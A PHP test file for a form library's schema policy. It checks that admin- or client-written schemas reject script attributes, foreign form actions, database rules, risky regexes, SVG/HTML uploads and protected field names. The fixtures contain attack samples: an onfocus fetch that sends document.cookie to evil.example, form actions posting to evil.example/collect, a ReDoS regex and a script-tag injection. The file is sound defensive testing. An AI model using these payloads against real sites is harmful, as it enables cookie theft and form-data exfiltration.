<?php

declare(strict_types=1);

namespace Ephraitech\Forms\Tests\Feature\Schema;

use CodeIgniter\Test\CIUnitTestCase;
use Ephraitech\Forms\Config\Forms;
use Ephraitech\Forms\Exceptions\FormException;
use Ephraitech\Forms\Form;
use Ephraitech\Forms\Schema\SchemaException;
use Ephraitech\Forms\Schema\SchemaPolicy;
use Ephraitech\Forms\Tests\Support\Fields\MoneyField;

/**
 * Restricted loading of schemas written by admins or clients.
 *
 * @internal
 */
final class SchemaPolicyTest extends CIUnitTestCase
{
    private Forms $config;

    protected function setUp(): void
    {
        parent::setUp();

        $this->config = new Forms();
    }

    /**
     * Error messages for a schema under a policy (restricted by default).
     *
     * @param array<array-key, mixed> $schema
     *
     * @return list<string>
     */
    private function errors(array $schema, ?SchemaPolicy $policy = null): array
    {
        try {
            Form::fromSchema($schema, $this->config, $policy);
        } catch (SchemaException $e) {
            return $e->getMessages();
        }

        return [];
    }

    /**
     * @param array<string, mixed> $field
     *
     * @return list<string>
     */
    private function fieldErrors(array $field, ?SchemaPolicy $policy = null): array
    {
        return $this->errors(['fields' => [$field]], $policy);
    }

    /**
     * A realistic schema an admin would write.
     *
     * @return array<string, mixed>
     */
    private function adminSchema(): array
    {
        return ['name' => 'enquiry', 'fields' => [
            ['type' => 'row', 'children' => [
                ['type' => 'text', 'name' => 'full_name', 'label' => 'Full name', 'rules' => 'required|min_length[3]|max_length[100]', 'width' => 6, 'autocomplete' => 'name'],
                ['type' => 'tel', 'name' => 'phone', 'label' => 'Phone', 'rules' => 'required|max_length[20]', 'width' => 6],
            ]],
            ['type' => 'email', 'name' => 'email', 'rules' => 'permit_empty|valid_email', 'attributes' => ['aria-describedby' => 'email-note', 'spellcheck' => 'false']],
            ['type' => 'fieldset', 'legend' => 'Your order', 'description' => 'Tell us what you need.', 'children' => [
                ['type' => 'select', 'name' => 'garment', 'label' => 'Garment', 'options' => ['suit' => 'Suit', 'kanzu' => 'Kanzu'], 'rules' => 'required'],
                ['type' => 'checkboxes', 'name' => 'extras', 'options' => ['monogram' => 'Monogram'], 'inline' => true],
                ['type' => 'number', 'name' => 'quantity', 'rules' => 'required|is_natural_no_zero|less_than_equal_to[20]'],
                ['type' => 'date', 'name' => 'needed_by', 'rules' => 'permit_empty|valid_date[Y-m-d]'],
                ['type' => 'text', 'name' => 'confirm_phone', 'rules' => 'permit_empty|matches[phone]'],
            ]],
            ['type' => 'file', 'name' => 'photo', 'max_size' => 2048, 'mimes' => ['image/jpeg', 'image/png'], 'image' => true],
            ['type' => 'textarea', 'name' => 'notes', 'rules' => 'permit_empty|max_length[500]', 'help' => 'Anything else?'],
            ['type' => 'checkbox', 'name' => 'terms', 'label' => 'I agree', 'rules' => 'required'],
            ['type' => 'submit', 'label' => 'Send enquiry'],
        ]];
    }

    // -- Default --------------------------------------------------------------

    public function testRealisticAdminSchemaPasses(): void
    {
        $this->assertSame([], $this->errors($this->adminSchema()));
    }

    public function testRestrictedIsTheDefaultEverywhere(): void
    {
        $attack = ['fields' => [['type' => 'text', 'name' => 'a', 'attributes' => ['onfocus' => 'alert(1)']]]];

        foreach ([
            'fromSchema'  => fn () => Form::fromSchema($attack, $this->config),
            'fromJson'    => fn () => Form::fromJson((string) json_encode($attack), $this->config),
            'loadSchema'  => fn () => Form::make('x', $this->config)->loadSchema($attack),
        ] as $entry => $load) {
            try {
                $load();
                $this->fail($entry . ' accepted an event-handler attribute');
            } catch (SchemaException $e) {
                $this->assertStringContainsString('the "onfocus" attribute is not allowed in this schema', $e->getMessage(), $entry);
            }
        }
    }

    public function testTrustedPolicyAllowsWhatRestrictedBlocks(): void
    {
        $schema = ['action' => '/elsewhere', 'fields' => [
            ['type' => 'text', 'name' => 'code', 'rules' => 'required|regex_match[/^A\d+$/]', 'attributes' => ['data-mask' => 'A999']],
            ['type' => 'password', 'name' => 'password'],
            ['type' => 'hidden', 'name' => 'role', 'default' => 'member'],
            ['type' => 'file', 'name' => 'logo', 'image' => true],
        ]];

        $this->assertNotSame([], $this->errors($schema));
        $this->assertSame([], $this->errors($schema, SchemaPolicy::trusted()));
    }

    // -- Attacks --------------------------------------------------------------

    public function testScriptAndBehaviourAttributesAreBlocked(): void
    {
        $this->assertSame(
            [
                'fields[0].attributes: the "onfocus" attribute is not allowed in this schema.',
                'fields[0].attributes: the "formaction" attribute is not allowed in this schema.',
                'fields[0].attributes: the "data-bs-sanitize" attribute is not allowed in this schema.',
                'fields[0].attributes: the "style" attribute is not allowed in this schema.',
            ],
            $this->fieldErrors(['type' => 'text', 'name' => 'a', 'attributes' => [
                'onfocus'          => "fetch('//evil.example/?c='+document.cookie)",
                'formaction'       => 'https://evil.example/collect',
                'data-bs-sanitize' => 'false',
                'style'            => 'position:fixed;inset:0',
            ]]),
        );
    }

    public function testFormLevelAttacks(): void
    {
        $this->assertSame(
            [
                'action: cannot be set in this schema; the application decides where the form is sent.',
                'attributes: the "onsubmit" attribute is not allowed in this schema.',
            ],
            $this->errors(['action' => 'https://evil.example/collect', 'attributes' => ['onsubmit' => 'steal()'], 'fields' => []]),
        );
    }

    public function testDatabaseAndDangerousRulesAreBlocked(): void
    {
        $this->assertSame(
            [
                'fields[0].rules: the "is_unique" rule is not allowed in this schema: it reads the database.',
                'fields[0].rules: the "regex_match" rule is not allowed in this schema: a badly written pattern can hang the server.',
                'fields[0].rules: the "my_custom_rule" rule is not allowed in this schema: it is not on the list of rules allowed in schemas.',
            ],
            $this->fieldErrors(['type' => 'email', 'name' => 'email', 'rules' => 'required|is_unique[users.email]|regex_match[/^(a+)+$/]|my_custom_rule']),
        );
    }

    public function testItemRulesAreCheckedToo(): void
    {
        $this->assertSame(
            ['fields[0].each_rules: the "is_not_unique" rule is not allowed in this schema: it reads the database.'],
            $this->fieldErrors(['type' => 'checkboxes', 'name' => 'tags', 'options' => ['a' => 'A'], 'each_rules' => 'is_not_unique[tags.slug]']),
        );
    }

    public function testRuleParametersAreChecked(): void
    {
        $this->assertSame(
            [
                'fields[0].rules: "max_length[ten]": the parameter must be a whole number such as [100].',
                'fields[0].rules: "matches[secret_column]": the parameter must be the name of another field in this form.',
                'fields[0].rules: "required[x]": this rule takes no parameter.',
                'fields[0].rules: "valid_date[Y-m-d<script>]": the parameter must be a date format such as [Y-m-d].',
            ],
            $this->fieldErrors(['type' => 'text', 'name' => 'a', 'rules' => 'max_length[ten]|matches[secret_column]|required[x]|valid_date[Y-m-d<script>]']),
        );
    }

    public function testFileRulesMustUseFileKeys(): void
    {
        $this->assertSame(
            ['fields[0].rules: the "max_size" rule is not allowed in this schema: use the file field\'s "max_size" key instead.'],
            $this->fieldErrors(['type' => 'file', 'name' => 'f', 'max_size' => 100, 'mimes' => 'application/pdf', 'rules' => 'max_size[f,999999]']),
        );
    }

    public function testUploadsNeedALimitAndAllowedTypes(): void
    {
        $this->assertSame(
            [
                'fields[0].max_size: is required for file fields in this schema (at most 10240 kilobytes).',
                'fields[0].mimes: is required for file fields in this schema: list the allowed types, such as ["image/jpeg", "image/png", "application/pdf"].',
            ],
            $this->fieldErrors(['type' => 'file', 'name' => 'logo', 'image' => true]),
            'image alone also accepts SVG, which can carry script',
        );

        $this->assertSame(
            [
                'fields[0].max_size: must be at most 10240 kilobytes.',
                'fields[0].mimes: "image/svg+xml" uploads are not allowed in this schema.',
                'fields[0].mimes: "text/html" uploads are not allowed in this schema.',
            ],
            $this->fieldErrors(['type' => 'file', 'name' => 'logo', 'max_size' => 999999, 'mimes' => ['image/png', 'image/svg+xml', 'text/html']]),
        );
    }

    public function testProtectedNamesAreBlocked(): void
    {
        $this->assertSame(
            [
                'fields[0].name: "role" is not allowed as a field name in this schema; it could overwrite protected data.',
                'fields[1].name: "is_admin" is not allowed as a field name in this schema; it could overwrite protected data.',
            ],
            $this->errors(['fields' => [
                ['type' => 'text', 'name' => 'role'],
                ['type' => 'checkbox', 'name' => 'is_admin'],
            ]]),
        );
    }

    public function testPasswordAndHiddenFieldsAreBlocked(): void
    {
        $errors = $this->errors(['fields' => [
            ['type' => 'password', 'name' => 'pin'],
            ['type' => 'hidden', 'name' => 'source'],
        ]]);

        $this->assertCount(2, $errors);
        $this->assertStringStartsWith('fields[0].type: "password" fields are not allowed in this schema. Allowed types: text, email,', $errors[0]);
        $this->assertStringStartsWith('fields[1].type: "hidden" fields are not allowed in this schema.', $errors[1]);
    }

    public function testRegisteredCustomTypesNeedToBeAllowed(): void
    {
        $this->config->fieldTypes = ['money' => MoneyField::class];
        $schema                   = ['fields' => [['type' => 'money', 'name' => 'budget', 'currency' => 'UGX']]];

        $this->assertStringStartsWith('fields[0].type: "money" fields are not allowed', $this->errors($schema)[0] ?? '');
        $this->assertSame([], $this->errors($schema, SchemaPolicy::restricted()->allowTypes('money')));
    }

    // -- Limits ---------------------------------------------------------------

    public function testSizeLimits(): void
    {
        $policy = SchemaPolicy::restricted()->withLimits(['max_fields' => 2, 'max_depth' => 2, 'max_options' => 2, 'max_text' => 10, 'max_rules' => 2, 'max_classes' => 1]);

        $this->assertSame(['fields[2]: the schema has more than 2 fields.'], $this->errors(['fields' => [
            ['type' => 'text', 'name' => 'a'], ['type' => 'text', 'name' => 'b'], ['type' => 'text', 'name' => 'c'],
        ]], $policy));

        $this->assertSame(['fields[0].children[0].children[0]: groups are nested more than 2 levels deep.'], $this->errors(['fields' => [
            ['type' => 'row', 'children' => [['type' => 'row', 'children' => [['type' => 'row', 'children' => []]]]]],
        ]], $policy));

        $this->assertSame(
            [
                'fields[0].label: must be at most 10 characters.',
                'fields[0].options: at most 2 options are allowed.',
                'fields[0].rules: at most 2 rules are allowed.',
                'fields[0].classes: at most 1 classes are allowed.',
            ],
            $this->fieldErrors(['type' => 'select', 'name' => 'a', 'label' => 'A very long label', 'options' => ['a' => 'A', 'b' => 'B', 'c' => 'C'], 'rules' => 'required|max_length[5]|min_length[1]', 'classes' => ['one', 'two']], $policy),
        );
    }

    public function testLongNamesAreRejected(): void
    {
        $this->assertSame(
            ['fields[0].name: must be at most 64 characters.'],
            $this->fieldErrors(['type' => 'text', 'name' => str_repeat('a', 65)]),
        );
    }

    // -- Customising ------------------------------------------------------------

    public function testCustomisedPolicy(): void
    {
        $policy = SchemaPolicy::restricted()
            ->allowRules(['valid_ip' => SchemaPolicy::PARAM_NONE])
            ->allowAttributes('data-track-*')
            ->allowMimes('application/zip')
            ->allowNames('status')
            ->forbidNames('customer_id')
            ->withMaxUploadSize(20480)
            ->allowAction();

        $schema = ['action' => '/enquiries', 'fields' => [
            ['type' => 'text', 'name' => 'status', 'rules' => 'valid_ip', 'attributes' => ['data-track-id' => 'x']],
            ['type' => 'file', 'name' => 'bundle', 'max_size' => 20480, 'mimes' => 'application/zip'],
        ]];

        $this->assertSame([], $this->errors($schema, $policy));
        $this->assertNotSame([], $this->errors($schema));
        $this->assertSame(
            ['fields[0].name: "customer_id" is not allowed as a field name in this schema; it could overwrite protected data.'],
            $this->fieldErrors(['type' => 'text', 'name' => 'customer_id'], $policy),
        );
    }

    public function testRestrictingFurther(): void
    {
        $policy = SchemaPolicy::restricted()->disallowTypes('file')->disallowRules('matches');

        $this->assertStringStartsWith('fields[0].type: "file" fields are not allowed', $this->fieldErrors(['type' => 'file', 'name' => 'f', 'max_size' => 1, 'mimes' => 'application/pdf'], $policy)[0]);
        $this->assertStringContainsString('the "matches" rule is not allowed', $this->errors(['fields' => [
            ['type' => 'text', 'name' => 'a'], ['type' => 'text', 'name' => 'b', 'rules' => 'matches[a]'],
        ]], $policy)[0]);
    }

    public function testPoliciesAreImmutable(): void
    {
        $base    = SchemaPolicy::restricted();
        $changed = $base->allowTypes('password');

        $this->assertNotSame($base, $changed);
        $this->assertFalse($base->allowsType('password'));
        $this->assertTrue($changed->allowsType('password'));
    }

    public function testUnsafeAllowancesAreRefused(): void
    {
        foreach ([
            static fn () => SchemaPolicy::restricted()->allowAttributes('onclick'),
            static fn () => SchemaPolicy::restricted()->allowAttributes('data-*'),
            static fn () => SchemaPolicy::restricted()->allowAttributes('style'),
            static fn () => SchemaPolicy::restricted()->allowMimes('image/svg+xml'),
            static fn () => SchemaPolicy::restricted()->allowMimes('text/html'),
            static fn () => SchemaPolicy::restricted()->allowRules(['regex_match' => 'anything']),
            static fn () => SchemaPolicy::restricted()->withLimits(['max_everything' => 5]),
            static fn () => SchemaPolicy::trusted()->allowTypes('text'),
        ] as $i => $call) {
            try {
                $call();
                $this->fail('call ' . $i . ' should be refused');
            } catch (FormException) {
                $this->addToAssertionCount(1);
            }
        }
    }

    public function testOfficeFormatsCanStillBeAllowed(): void
    {
        $policy = SchemaPolicy::restricted()->allowMimes('application/vnd.oasis.opendocument.text');

        $this->assertTrue($policy->allowsMime('application/vnd.oasis.opendocument.text'));
        $this->assertTrue($policy->allowsMime('application/vnd.openxmlformats-officedocument.wordprocessingml.document'));
    }
}
